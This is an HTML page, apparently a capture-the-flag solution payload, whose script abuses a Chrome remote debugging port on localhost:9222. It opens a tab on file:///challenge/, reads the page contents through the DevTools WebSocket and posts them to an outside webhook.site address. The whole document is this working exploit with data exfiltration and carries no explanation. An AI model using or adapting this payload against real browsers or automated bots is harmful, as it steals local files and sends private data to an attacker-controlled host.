
<!doctype html>
<html>
<body>
<pre id="out">Starting...</pre>
<script>
(async () => {
  const out = document.getElementById("out");
  const hook = "https://webhook.site/cc90bdd9-e54f-4fae-865b-e49f3735034c";

  function report(x) {
    out.textContent = String(x);
    return fetch(hook, {
      method: "POST",
      mode: "no-cors",
      body: String(x)
    }).catch(() => {});
  }

  try {
    const r = await fetch(
      "http://localhost:9222/json/new?file:///challenge/",
      { method: "PUT" }
    );
    const tab = await r.json();
    const ws = new WebSocket(tab.webSocketDebuggerUrl);

    ws.onopen = () => {
      ws.send(JSON.stringify({
        id: 1,
        method: "Runtime.evaluate",
        params: { expression: "document.body.innerHTML" }
      }));
    };

    ws.onmessage = e => report(e.data);
    ws.onerror = () => report("WebSocket connection failed");
  } catch (e) {
    report("Error: " + String(e));
  }
})();
</script>
</body>
</html>
